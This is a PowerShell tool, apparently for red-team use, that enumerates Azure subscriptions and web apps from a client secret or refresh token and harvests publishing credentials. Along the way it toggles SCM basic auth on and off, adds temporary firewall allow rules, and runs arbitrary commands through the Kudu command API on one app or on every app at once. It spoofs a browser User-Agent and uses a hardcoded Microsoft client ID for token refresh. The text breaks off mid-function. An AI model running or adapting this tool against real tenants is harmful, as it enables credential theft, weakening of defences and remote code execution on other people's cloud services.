function WebApp-Shell {

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Show-ClientLoginGui {
    param([switch]$Topmost)

    if ($Host.Runspace.ApartmentState -ne 'STA') {
        Write-Warning "Run with: pwsh -STA"
    }

    Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="ARM WebApp  Enum Shell" Height="560" Width="720"
        WindowStartupLocation="CenterScreen" ResizeMode="NoResize"
        Background="#0B1220" FontFamily="Segoe UI" SnapsToDevicePixels="True">
  <Window.Resources>
    <DropShadowEffect x:Key="CardShadow" BlurRadius="22" ShadowDepth="0" Color="#99000000"/>
    <Style TargetType="TextBox">
      <Setter Property="Background" Value="#0F1626"/>
      <Setter Property="Foreground" Value="#E5E7EB"/>
      <Setter Property="BorderBrush" Value="#334155"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="8,4"/>
      <Setter Property="Height" Value="34"/>
    </Style>
    <Style TargetType="PasswordBox">
      <Setter Property="Background" Value="#0F1626"/>
      <Setter Property="Foreground" Value="#E5E7EB"/>
      <Setter Property="BorderBrush" Value="#334155"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="8,4"/>
      <Setter Property="Height" Value="34"/>
    </Style>
    <Style TargetType="Button">
      <Setter Property="Padding" Value="18,10"/>
      <Setter Property="FontWeight" Value="SemiBold"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Cursor" Value="Hand"/>
    </Style>
  </Window.Resources>

  <Grid Margin="22">
    <Grid.RowDefinitions><RowDefinition Height="140"/><RowDefinition Height="*"/><RowDefinition Height="Auto"/></Grid.RowDefinitions>

    <Border Grid.Row="0" CornerRadius="18" Margin="0,0,0,14">
      <Border.Background>
        <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
          <GradientStop x:Name="gs1" Color="#3B82F6" Offset="0"/>
          <GradientStop x:Name="gs2" Color="#8B5CF6" Offset="1"/>
        </LinearGradientBrush>
      </Border.Background>
      <Grid Margin="18">
        <Grid.ColumnDefinitions><ColumnDefinition Width="Auto"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
        <StackPanel Grid.Column="1" Margin="14,0,0,0" VerticalAlignment="Center">
          <TextBlock Text="WebApp Enumeration - Interactive Shell" Foreground="#f8fafc" FontSize="22" FontWeight="Bold"/>
          <TextBlock Text="Require explicit authorization" Foreground="#E0E7FF" FontSize="13"/>
        </StackPanel>
      </Grid>
    </Border>

    <Border Grid.Row="1" CornerRadius="18" Background="#101828" Padding="22" Effect="{StaticResource CardShadow}">
      <Grid>
        <Grid.RowDefinitions><RowDefinition Height="Auto"/><RowDefinition Height="Auto"/><RowDefinition Height="Auto"/><RowDefinition Height="12"/><RowDefinition Height="Auto"/></Grid.RowDefinitions>
        <Grid.ColumnDefinitions><ColumnDefinition Width="170"/><ColumnDefinition Width="*"/><ColumnDefinition Width="Auto"/></Grid.ColumnDefinitions>

        <TextBlock Grid.Row="0" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Client ID"/>
        <TextBox   x:Name="ClientIdBox" Grid.Row="0" Grid.Column="1" Margin="0,4,0,4"/>

        <TextBlock Grid.Row="1" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Client Secret"/>
        <PasswordBox x:Name="SecretBox" Grid.Row="1" Grid.Column="1" Margin="0,4,0,4"/>
        <TextBox   x:Name="SecretPlainBox" Grid.Row="1" Grid.Column="1" Margin="0,4,0,4" Visibility="Collapsed"/>
        <CheckBox  x:Name="ShowSecretChk" Content="Show" Grid.Row="1" Grid.Column="2" Margin="10,6,0,4" Foreground="#B4C6FC" VerticalAlignment="Center"/>

        <TextBlock Grid.Row="2" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Tenant Domain (e.g. contoso.com)"/>
        <TextBox   x:Name="DomainBox" Grid.Row="2" Grid.Column="1" Margin="0,4,0,4"/>

        <TextBlock x:Name="ErrorText" Grid.Row="4" Grid.ColumnSpan="3" Foreground="#FCA5A5" FontSize="12" Visibility="Collapsed"/>
      </Grid>
    </Border>

    <DockPanel Grid.Row="2" Margin="0,16,0,0" LastChildFill="False">
      <StackPanel Orientation="Horizontal" DockPanel.Dock="Right">
        <Button x:Name="CancelBtn" Content="Cancel" Margin="0,0,8,0" Background="#0E1726" Foreground="#CBD5E1" BorderBrush="#334155" IsCancel="True"/>
        <Button x:Name="OkBtn" Content="Continue" Background="#3B82F6" Foreground="White" BorderBrush="#2563EB" IsDefault="True"/>
      </StackPanel>
    </DockPanel>
  </Grid>
</Window>
"@

    $xdoc   = New-Object System.Xml.XmlDocument
    $xdoc.LoadXml($xaml)
    $reader = New-Object System.Xml.XmlNodeReader $xdoc
    $window = [Windows.Markup.XamlReader]::Load($reader)

    $ClientIdBox    = $window.FindName("ClientIdBox")
    $SecretBox      = $window.FindName("SecretBox")
    $SecretPlainBox = $window.FindName("SecretPlainBox")
    $ShowSecretChk  = $window.FindName("ShowSecretChk")
    $DomainBox      = $window.FindName("DomainBox")
    $OkBtn          = $window.FindName("OkBtn")
    $CancelBtn      = $window.FindName("CancelBtn")
    $ErrorText      = $window.FindName("ErrorText")
    $gs1            = $window.FindName("gs1")
    $gs2            = $window.FindName("gs2")

    if ($Topmost) { $window.Topmost = $true }

    $window.Add_Loaded({
        $c1 = [Windows.Media.ColorConverter]::ConvertFromString("#3B82F6")
        $c2 = [Windows.Media.ColorConverter]::ConvertFromString("#8B5CF6")
        $c3 = [Windows.Media.ColorConverter]::ConvertFromString("#06B6D4")
        $c4 = [Windows.Media.ColorConverter]::ConvertFromString("#22D3EE")
        foreach ($z in @($gs1,$gs2)) { $null = $z } # no-op keep refs

        $a1 = New-Object Windows.Media.Animation.ColorAnimation($c1, $c3, (New-Object Windows.Duration([TimeSpan]::FromSeconds(6))))
        $a1.AutoReverse = $true; $a1.RepeatBehavior = [Windows.Media.Animation.RepeatBehavior]::Forever
        $a2 = New-Object Windows.Media.Animation.ColorAnimation($c2, $c4, (New-Object Windows.Duration([TimeSpan]::FromSeconds(6))))
        $a2.AutoReverse = $true; $a2.RepeatBehavior = [Windows.Media.Animation.RepeatBehavior]::Forever
        $gs1.BeginAnimation([Windows.Media.GradientStop]::ColorProperty, $a1)
        $gs2.BeginAnimation([Windows.Media.GradientStop]::ColorProperty, $a2)
        $ClientIdBox.Focus() | Out-Null
    })

    $ShowSecretChk.Add_Checked({
        $SecretPlainBox.Text       = $SecretBox.Password
        $SecretPlainBox.Visibility = "Visible"
        $SecretBox.Visibility      = "Collapsed"
    })
    $ShowSecretChk.Add_Unchecked({
        $SecretBox.Password        = $SecretPlainBox.Text
        $SecretPlainBox.Visibility = "Collapsed"
        $SecretBox.Visibility      = "Visible"
    })

    $handler = { $OkBtn.RaiseEvent((New-Object Windows.RoutedEventArgs([System.Windows.Controls.Button]::ClickEvent))) }
    foreach ($box in @($ClientIdBox,$SecretBox,$SecretPlainBox,$DomainBox)) {
        $box.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })
    }

    $OkBtn.Add_Click({
        $ErrorText.Visibility = "Collapsed"
        $cid = $ClientIdBox.Text.Trim()
        $dom = $DomainBox.Text.Trim()
        $sec = if ($ShowSecretChk.IsChecked) { $SecretPlainBox.Text } else { $SecretBox.Password }

        if ([string]::IsNullOrWhiteSpace($cid) -or [string]::IsNullOrWhiteSpace($sec) -or [string]::IsNullOrWhiteSpace($dom)) {
            $ErrorText.Text = "Please fill all fields."; $ErrorText.Visibility = "Visible"; return
        }
        $tmpGuid = [Guid]::Empty
        if (-not [Guid]::TryParse($cid, [ref]$tmpGuid)) {
            $ErrorText.Text = "Client ID must be a valid GUID."; $ErrorText.Visibility = "Visible"; return
        }
        $result = [PSCustomObject]@{ ClientId=$cid; ClientSecret=$sec; Domain=$dom }
        $window.Tag = $result; $window.DialogResult = $true; $window.Close()
    })
    $CancelBtn.Add_Click({ $window.DialogResult = $false; $window.Close() })

    $null = $window.ShowDialog()
    if ($window.DialogResult -eq $true) { return $window.Tag }
}

function GetTenantID {
    param([string]$TenantName)
    try {
        $resp = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$TenantName/.well-known/openid-configuration" -ErrorAction Stop
        return ($resp.issuer -split '/')[3]
    } catch {
        Write-Host "[!] Invalid tenant domain." -ForegroundColor Red
        return $null
    }
}

function GetAzureARMToken {
    param([string]$RefreshToken,[string]$ClientID,[string]$ClientSecret,[string]$TenantID)
    $Url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
    $Headers = @{ "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" }
    if ($RefreshToken -and -not $ClientID -and -not $ClientSecret) {
        $Body = @{ client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c"; scope="https://management.azure.com/.default"; grant_type="refresh_token"; refresh_token=$RefreshToken }
    } elseif ($ClientID -and $ClientSecret -and -not $RefreshToken) {
        $Body = @{ grant_type="client_credentials"; scope="https://management.azure.com/.default"; client_id=$ClientID; client_secret=$ClientSecret }
    } else { return $null }

    try {
        (Invoke-RestMethod -Method POST -Uri $Url -Body $Body -Headers $Headers -ContentType 'application/x-www-form-urlencoded').access_token
    } catch { $_ }
}

function GetSubscriptions {
    param([string]$AzureARMToken,[int]$MaxRetries = 8)
    $Headers = @{ 'Authorization'="Bearer $AzureARMToken"; 'Accept'='application/json'; 'User-Agent'="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" }
    $out = @(); $url="https://management.azure.com/subscriptions?api-version=2021-01-01"
    while ($url) {
        $attempt=0
        while ($true) {
            try { $resp = Invoke-RestMethod -Method GET -Uri $url -Headers $Headers -ErrorAction Stop; break }
            catch {
                $attempt++
                $httpResp = $_.Exception.Response
                if ($httpResp -and [int]$httpResp.StatusCode -eq 429 -and $attempt -le $MaxRetries) {
                    $retryAfter = $httpResp.Headers['Retry-After']; if (-not $retryAfter) { $retryAfter = 60 }; Start-Sleep -Seconds ([int]$retryAfter); continue
                }
                throw
            }
        }
        if ($resp.value) {
            $out += $resp.value | ForEach-Object {
                [pscustomobject]@{ DisplayName=$_.displayName; SubscriptionId=$_.subscriptionId; State=$_.state }
            }
        }
        $url = $resp.nextLink
    }
    $out
}

function Test-CanToggleScmBasicAuth {
    param([string]$SubscriptionId,[string]$ResourceGroupName,[string]$SiteName,[string]$AzureAccessToken)
    $headers = @{ 
    'Authorization' = "Bearer $AzureAccessToken" 
    'User-Agent' ="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    }
    $permUrl = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroupName/providers/Microsoft.Web/sites/$SiteName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
    $resp = Invoke-RestMethod -Uri $permUrl -Headers $headers -Method GET

    $actions    = @(); $not = @()
    foreach ($v in $resp.value) { $actions += $v.actions; $not += $v.notActions }
    $actions    = $actions    | ? { $_ } | % { $_.ToLower() } | Select-Object -Unique
    $not        = $not        | ? { $_ } | % { $_.ToLower() } | Select-Object -Unique

    $needed = "microsoft.web/sites/basicpublishingcredentialspolicies/write"
    function Covered([string]$a,[string[]]$pats){ foreach($p in $pats){ if ($a -like $p) { return $true } }; $false }

    $allow = Covered $needed $actions
    if (-not $allow) {
        $allow = Covered $needed ($actions + @("microsoft.web/sites/basicpublishingcredentialspolicies/*","microsoft.web/sites/*","microsoft.web/*","*"))
    }
    $deny = Covered $needed $not
    return [bool]($allow -and -not $deny)
}

function Get-KuduBaseAndHeaders {
    param([Parameter(Mandatory)][pscustomobject]$App)
    if (-not (Ensure-AppCreds -App $App)) { throw "App '$($App.Name)': no usable publishing creds (enable BasicAuth or fetch publish profile)." }
    $scmBase = if ($App.Credentials.ScmUri) { "https://" + ([uri]$App.Credentials.ScmUri).Host } else { "https://$($App.Name).scm.azurewebsites.net" }
    $pair  = "$($App.Credentials.PublishingUserName):$($App.Credentials.PublishingPassword)"
    $basic = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($pair))
    $headers = @{ Authorization = "Basic $basic" }
    [pscustomobject]@{ Base=$scmBase; Headers=$headers }
}

function Test-KuduCapabilities {
    param([Parameter(Mandatory)][pscustomobject]$App)
    $ku = Get-KuduBaseAndHeaders -App $App
    $cap = [ordered]@{ ScmBase=$ku.Base; HasInfo=$false; HasEnvironment=$false; HasVfs=$false; HasCommandApi=$false; IsFunctionApp=$false; KuduVersion=$null; Platform=$App.Platform }
    try { $info = Invoke-RestMethod -Method GET -Uri "$($ku.Base)/api/info" -Headers $ku.Headers -ErrorAction Stop; $cap.HasInfo=$true; if ($info.version){$cap.KuduVersion=$info.version} } catch {}
    try { $env  = Invoke-RestMethod -Method GET -Uri "$($ku.Base)/api/environment" -Headers $ku.Headers -ErrorAction Stop; $cap.HasEnvironment=$true; if ($env.Values -and ($env.Values["FUNCTIONS_EXTENSION_VERSION"] -or $env.Values["FUNCTIONS_WORKER_RUNTIME"])) { $cap.IsFunctionApp=$true } } catch {}
    try { $null = Invoke-RestMethod -Method GET -Uri "$($ku.Base)/api/vfs/" -Headers $ku.Headers -ErrorAction Stop; $cap.HasVfs=$true } catch {}
    try {
        $testBody = @{ command = "echo ping"; dir = if ($App.Platform -eq 'Linux') { "/home" } else { "D:\home" } } | ConvertTo-Json
        $resp = Invoke-RestMethod -Method POST -Uri "$($ku.Base)/api/command" -Headers $ku.Headers -ContentType 'application/json' -Body $testBody -ErrorAction Stop
        $cap.HasCommandApi = $true
    } catch {
        $we = $_.Exception
        if ($we.Response -and $we.Response.StatusCode -in 400,401,403,500) { $cap.HasCommandApi = $true }
    }
    [pscustomobject]$cap
}

function Open-WebAppDebugConsole { param([Parameter(Mandatory)][pscustomobject]$App); $ku = Get-KuduBaseAndHeaders -App $App; Start-Process "$($ku.Base)/newui" }

function Ensure-AppCreds {
    param([Parameter(Mandatory)][pscustomobject]$App)
    if ($App.Credentials.PublishingUserName -and $App.Credentials.PublishingPassword) { return $true }

    if (-not $script:ArmToken -and $script:ClientId -and $script:ClientSecret -and $script:TenantId) {
        $script:ArmToken = GetAzureARMToken -ClientID $script:ClientId -ClientSecret $script:ClientSecret -TenantID $script:TenantId
    }
    if (-not $script:ArmToken) { return $false }

    try {
        $headersArm = @{ Authorization = "Bearer $script:ArmToken"; Accept='application/json' }
        $base = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)"

        $pol = Invoke-RestMethod "$base/basicPublishingCredentialsPolicies?api-version=2024-11-01" -Headers $headersArm -ErrorAction Stop
        $prevScm = ($pol.value | Where-Object name -eq 'scm').properties.allow
        $turnedOn = $false
        if (-not $prevScm) {
            $bodyOn = @{ properties = @{ allow = $true } } | ConvertTo-Json
            try {
                Invoke-RestMethod -Method PUT -Uri "$base/basicPublishingCredentialsPolicies/scm?api-version=2024-11-01" -Headers $headersArm -ContentType 'application/json' -Body $bodyOn | Out-Null
                Start-Sleep -Seconds 2
                $turnedOn = $true
            } catch {
                Write-Warning "[!] SCM enable blocked by RBAC/Policy. Cannot fetch publishing creds."
                return $false
            }
        }

        $list = $null
        try {
            $list = Invoke-RestMethod -Method POST -Uri "$base/config/publishingcredentials/list?api-version=2024-11-01" -Headers $headersArm -ErrorAction Stop
        } catch {}

        if ($list -and $list.properties) {
            $App.Credentials.PublishingUserName = $list.properties.publishingUserName
            $App.Credentials.PublishingPassword = $list.properties.publishingPassword
        }

        if ($turnedOn) {
            $bodyScm = @{ properties = @{ allow = [bool]$prevScm } } | ConvertTo-Json
            try { Invoke-RestMethod -Method PUT -Uri "$base/basicPublishingCredentialsPolicies/scm?api-version=2024-11-01" -Headers $headersArm -ContentType 'application/json' -Body $bodyScm | Out-Null } catch {}
        }
    } catch {}

    return [bool]($App.Credentials.PublishingUserName -and $App.Credentials.PublishingPassword)
}


function Get-MyPublicIp {
    param([switch]$CIDR)

    foreach ($u in @(
        'https://ifconfig.me/ip','https://api.ipify.org','https://ipv4.icanhazip.com'
    )) {
        try {
            $ip = (Invoke-WebRequest -UseBasicParsing -Uri $u -TimeoutSec 5).Content.Trim()
            if ($ip -match '^\d{1,3}(\.\d{1,3}){3}$') {
                if ($CIDR) {
                    return "$ip/32"
                } else {
                    return $ip
                }

            }
        } catch {}
    }
    return $null
}
function Get-AppSlotFromScmHost {
    param([Parameter(Mandatory)][pscustomobject]$App)
 
    try {
        $host = ([uri]$App.Credentials.ScmUri).Host
      
        $left = $host -replace '\.scm\.azurewebsites\.net$',''
        $parts = $left.Split('-')
        if ($parts.Count -ge 2) {

            $maybeSlot = $parts[-1]
            $maybeApp  = ($parts[0..($parts.Count-2)] -join '-')
            if ($maybeApp -eq $App.Name) { return $maybeSlot }
        }
    } catch {}
    return $null
}

function Get-WebConfig {
    param(
        [string]$Sub,
        [string]$Rg,
        [string]$Site,
        [string]$Bearer,
        [string]$Slot 
    )
    $h = @{ 
        "Authorization" = "Bearer $Bearer"
        "Accept" ='application/json' 
        "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    }
    $apiVersions = @('2024-11-01','2023-01-01','2022-09-01')
    $base = "https://management.azure.com/subscriptions/$Sub/resourceGroups/$Rg/providers/Microsoft.Web/sites/$Site"
    foreach ($ver in $apiVersions) {
        $cfgUrl = if ($Slot) {
            "$base/slots/$Slot/config/web?api-version=$ver"
        } else {
            "$base/config/web?api-version=$ver"
        }
        try {
            $cfg = Invoke-RestMethod $cfgUrl -Headers $h -Method GET -ErrorAction Stop
        } catch {
            
            continue
        }
        if ($cfg -and $cfg.PSObject -and $cfg.PSObject.Properties['properties']) {
            return ,@($cfg,$cfgUrl,$h)
        }
    }

    
    $diagUrl = if ($Slot) { "$base/slots/$Slot?api-version=2024-11-01" } else { "$base?api-version=2024-11-01" }
    try {
        $siteObj = Invoke-RestMethod $diagUrl -Headers $h -Method GET -ErrorAction Stop
        Write-Warning "[!] config/web has no 'properties' for '$Site' (slot='$Slot'). Site GET succeeded; might be schema/plan-specific or RBAC."
    } catch {
        Write-Warning "[!] Cannot GET site resource for '$Site' (slot='$Slot'). Likely RBAC/ID issue."
    }
    return ,@($null,$cfgUrl,$h)
}


function Add-TempScmIpAllow {
  param(
    [string]$Sub,
    [string]$Rg,
    [string]$Site,
    [string]$Bearer,
    [string]$MyIpCidr,
    [int]$Minutes = 20,
    [string]$Slot
  )


  if (-not $Slot -and $script:CurrentApp -and $script:CurrentApp.Name -eq $Site) {
      $Slot = Get-AppSlotFromScmHost -App $script:CurrentApp
  }

  $cfg,$cfgUrl,$h = Get-WebConfig -Sub $Sub -Rg $Rg -Site $Site -Bearer $Bearer -Slot $Slot
  if (-not $cfg -or -not ($cfg.PSObject -and $cfg.PSObject.Properties['properties'])) {
    throw "Failed reading site config/web for '$Site' (slot='$Slot') – no 'properties' in response (check RBAC / resourceId / slots)."
  }

  $useMain = [bool]$cfg.properties.scmIpSecurityRestrictionsUseMain
  $target  = if ($useMain) { 'ipSecurityRestrictions' } else { 'scmIpSecurityRestrictions' }
  $arr     = @($cfg.properties.$target); if (-not $arr) { $arr = @() }

  $ruleName = "TempAllow-$($MyIpCidr.Replace('/','_'))"
  $exists = $arr | Where-Object { $_.ipAddress -eq $MyIpCidr -and $_.action -eq 'Allow' }
  if (-not $exists) {
    $prio = if ($arr.priority) { [int]([int]($arr.priority | Sort-Object | Select-Object -Last 1) + 10) } else { 100 }
    $new = [ordered]@{ name=$ruleName; description="Temp allow for Kudu"; action="Allow"; ipAddress=$MyIpCidr; priority=$prio }
    $arr += (New-Object psobject -Property $new)
    $cfg.properties.$target = $arr
    Invoke-RestMethod $cfgUrl -Headers $h -Method PUT -Body ($cfg | ConvertTo-Json -Depth 25) -ContentType 'application/json' | Out-Null
  }

  
  Start-Job {
    Start-Sleep -Seconds ($using:Minutes*60)
    try {
      $cfg2 = Invoke-RestMethod $using:cfgUrl -Headers $using:h -Method GET
      if ($cfg2 -and $cfg2.PSObject.Properties['properties']) {
        $useMain2 = [bool]$cfg2.properties.scmIpSecurityRestrictionsUseMain
        if ($useMain2) { $target2 = 'ipSecurityRestrictions' } else { $target2 = 'scmIpSecurityRestrictions' }
        $arr2 = @($cfg2.properties.$target2)
        if ($arr2) {
          $cfg2.properties.$target2 = $arr2 | Where-Object { $_.name -ne $using:ruleName }
          Invoke-RestMethod $using:cfgUrl -Headers $using:h -Method PUT -Body ($cfg2 | ConvertTo-Json -Depth 25) -ContentType 'application/json' | Out-Null
        }
      }
    } catch {}
  } | Out-Null

  return $ruleName, $target, $useMain
}



function Remove-TempScmIpAllow {
  param([string]$Sub,[string]$Rg,[string]$Site,[string]$Bearer,[string]$RuleName)
  $cfg,$cfgUrl,$h = Get-WebConfig -Sub $Sub -Rg $Rg -Site $Site -Bearer $Bearer
  foreach ($t in 'scmIpSecurityRestrictions','ipSecurityRestrictions') {
    $arr = @($cfg.properties.$t)
    if ($arr) {
      $new = $arr | Where-Object { $_.name -ne $RuleName }
      if ($new.Count -ne $arr.Count) {
        $cfg.properties.$t = $new
        try { Invoke-RestMethod $cfgUrl -Headers $h -Method PUT -Body ($cfg | ConvertTo-Json -Depth 25) -ContentType 'application/json' | Out-Null } catch {}
      }
    }
  }
}



function Get-WebApp {
    param([string]$AzureARMToken,[pscustomobject[]]$Subscriptions,[string]$RefreshToken,[string]$ClientID,[string]$ClientSecret,[string]$TenantID,[int]$MaxRetries=3)
    $global:WebApps = @()

    foreach ($sub in $Subscriptions) {
        $HeadersARM = @{ 'Authorization'="Bearer $AzureARMToken"; 'Accept'='application/json'; 'User-Agent'="Mozilla/5.0" }
        $listUrl = "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resources?`$filter=resourceType%20eq%20'Microsoft.Web%2Fsites'&api-version=2016-09-01"

        Write-Host "`n===============================================================================" -ForegroundColor DarkGray
        Write-Host "Subscription: $($sub.DisplayName) - $($sub.SubscriptionId)" -ForegroundColor Cyan
        Write-Host "-------------------------------------------------------------------------------" -ForegroundColor DarkGray

        do {
            $attempt=0
            while ($true) {
                try { $listResp = Invoke-RestMethod -Method GET -Uri $listUrl -Headers $HeadersARM -ErrorAction Stop; break }
                catch {
                    $attempt++
                    $httpResp = $_.Exception.Response
                    $code = if ($httpResp) { [int]$httpResp.StatusCode } else { $null }
                    if ($code -eq 429 -and $attempt -le $MaxRetries) {
                        $retryAfter = $httpResp.Headers['Retry-After']; if (-not $retryAfter) { $retryAfter = 60 }; Start-Sleep -Seconds ([int]$retryAfter); continue
                    } elseif ($code -eq 401) {
                        if ($ClientID -and $ClientSecret -and $TenantID) {
                            $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                        }
                        elseif ($RefreshToken -and $TenantID) {
                            $AzureARMToken = GetAzureARMToken -RefreshToken $RefreshToken -TenantID $TenantID 
                        }
                        else { throw }
                        $HeadersARM['Authorization'] = "Bearer $AzureARMToken"
                        if ($attempt -le $MaxRetries) { continue } else { throw }
                    } elseif ($code -eq 403) {
                        Write-Warning "[#] 403 listing WebApps for sub $($sub.SubscriptionId) ($($sub.DisplayName)) — skipping."
                        $listResp = $null; break
                    } else { throw }
                }
            }
            if (-not $listResp) { break }

            foreach ($WP in $listResp.value) {
                $WPName = "$($WP.name)"; $WPID="$($WP.id)"
                if ($WPID -notmatch '/resourceGroups/([^/]+)/') { continue }
                $ResourceGroup = $Matches[1]

                Write-Host "`n[>] Checking $WPName" -ForegroundColor Yellow
                $siteUrl = "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resourceGroups/$ResourceGroup/providers/Microsoft.Web/sites/$WPName`?api-version=2024-11-01"
                $site = $null; try { $site = Invoke-RestMethod -Uri $siteUrl -Headers $HeadersARM -Method GET } catch {}

                $isLinux = ($site.kind -match 'linux')
                $platform = if ($isLinux) {'Linux'} else {'Windows'}

                $httpsOnly   = [bool]$site.properties.httpsOnly
                $defaultHost = $site.properties.defaultHostName
                $WebAppUrl   = if ($httpsOnly) { "https://$defaultHost" } else { "http://$defaultHost" }

                # SCM policy
                $scmPolUrl = "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resourceGroups/$ResourceGroup/providers/Microsoft.Web/sites/$WPName/basicPublishingCredentialsPolicies/scm?api-version=2024-11-01"
                $TestingSCM = $null; try { $TestingSCM = Invoke-RestMethod -Uri $scmPolUrl -Headers $HeadersARM -Method GET } catch {}
                $SCMEnabled = [bool]$TestingSCM.properties.allow

                
                $UserName=$null; $Password=$null
                $pubUrl = "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resourceGroups/$($ResourceGroup)/providers/Microsoft.Web/sites/$($WPName)/config/publishingcredentials/list?api-version=2024-11-01"
                try {
                    $px = Invoke-RestMethod -Uri $pubUrl -Headers $HeadersARM -Method POST
                    $UserName = $px.properties.publishingUserName
                    $Password = $px.properties.publishingPassword
                    if ($UserName -and $Password) { Write-Host "  [+] Publishing credentials available" -ForegroundColor Green }
                } catch { Write-Host "  [-] Publishing credentials not available (policy/RBAC?)" -ForegroundColor DarkYellow }

                $wa = [pscustomobject]@{
                    Name             = $WPName
                    ResourceGroup    = $ResourceGroup
                    SubscriptionId   = $sub.SubscriptionId
                    Url              = $WebAppUrl
                    Platform         = $platform
                    Credentials      = [pscustomobject]@{
                        PublishingUserName = $UserName
                        PublishingPassword = $Password
                        ScmUri             = "https://$($WPName).scm.azurewebsites.net/"
                    }
                    WorkingDirLinux   = "/home/site/wwwroot"
                    WorkingDirWindows = "site\wwwroot"
                    ScmEnabled        = [bool]$SCMEnabled
                }
                $global:WebApps += $wa
            }

           if ($listResp -and $listResp.PSObject.Properties['nextLink']) {
                $listUrl = $listResp.nextLink
        } else {
            $listUrl = $null
        }

        } while ($listUrl)
    }
}

function ChnageSCM { 
    param([string]$AzureARMToken,[string]$SubscriptionId,[string]$ResourceGroup,[string]$WPName,[switch]$Add,[switch]$Delete)
    $scmPolUrl = "https://management.azure.com/subscriptions/$($SubscriptionId)/resourceGroups/$($ResourceGroup)/providers/Microsoft.Web/sites/$($WPName)/basicPublishingCredentialsPolicies/scm?api-version=2024-11-01"
    $HeadersARM = @{ 'Authorization'="Bearer $AzureARMToken"; 'Accept'='application/json'; 'User-Agent'="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" }

    if ($Add) {
        $BodyChangeSCM = @{ properties = @{ allow = $true } } | ConvertTo-Json -Depth 3
        try { Invoke-RestMethod -Method PUT -Uri $scmPolUrl -Body $BodyChangeSCM -Headers $HeadersARM -ContentType "application/json"; Start-Sleep -Seconds 2; Write-Host "[+] SCM enabled" -ForegroundColor Green }
        catch { throw "Failed enabling SCM: $($_.Exception.Message)" }
    }
    if ($Delete) {
        Write-Host "[!] Cleaning: disabling SCM..." -ForegroundColor Yellow
        $BodyDisableSCM = @{ properties = @{ allow = $false } } | ConvertTo-Json -Depth 3
        try { Invoke-RestMethod -Method PUT -Uri $scmPolUrl -Body $BodyDisableSCM -Headers $HeadersARM -ContentType "application/json"; Write-Host "[+] SCM disabled" -ForegroundColor Green }
        catch { Write-Warning "[-] Failed to disable SCM back." }
    }
}

function Invoke-WebAppCommand {
    param([Parameter(Mandatory)][pscustomobject]$App,[Parameter(Mandatory)][string]$Command,[string]$WorkingDirWindows="site\wwwroot",[string]$WorkingDirLinux="/home/site/wwwroot")

    if (-not (Ensure-AppCreds -App $App)) { throw "App '$($App.Name)': missing publishing creds and could not refetch." }

    $scmBase = if ($App.Credentials.ScmUri) { "https://" + ([uri]$App.Credentials.ScmUri).Host } else { "https://$($App.Name).scm.azurewebsites.net" }
    $pair  = "$($App.Credentials.PublishingUserName):$($App.Credentials.PublishingPassword)"
    $basic = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($pair))
    $headers = @{ Authorization = "Basic $basic" }

    $body = if ($App.Platform -eq 'Linux') {
        @{ command = "bash -lc ""$Command"""; dir = $WorkingDirLinux } | ConvertTo-Json
    } else {
        if ($Command.Trim().StartsWith("powershell",[System.StringComparison]::OrdinalIgnoreCase)) {
            @{ command = $Command; dir = $WorkingDirWindows } | ConvertTo-Json
        } else {
            @{ command = "cmd /c $Command"; dir = $WorkingDirWindows } | ConvertTo-Json
        }
    }

    try {
        $resp = Invoke-RestMethod -Method POST -Uri "$($scmBase)/api/command" -Headers $headers -ContentType 'application/json' -Body $body -ErrorAction Stop
        [pscustomobject]@{ AppName=$App.Name; ExitCode=$resp.ExitCode; Output=$resp.Output; Error=$resp.Error }
    } catch {
        $we = $_.Exception
        if ($we.Response -and ($we.Response.StatusCode -eq 403)) {
            $hdr = $we.Response.Headers['x-ms-forbidden-ip']
            if ($hdr) { throw "403 Ip Forbidden: your IP ($hdr) is not allowed by SCM Access Restrictions." }
        }
        throw
    }
}

function Invoke-CommandOnAllWebApps { param([Parameter(Mandatory)][string]$Command)
    if (-not $global:WebApps -or $global:WebApps.Count -eq 0) { throw "No WebApps in memory. Run Get-WebApp first." }
    foreach ($app in $global:WebApps) {
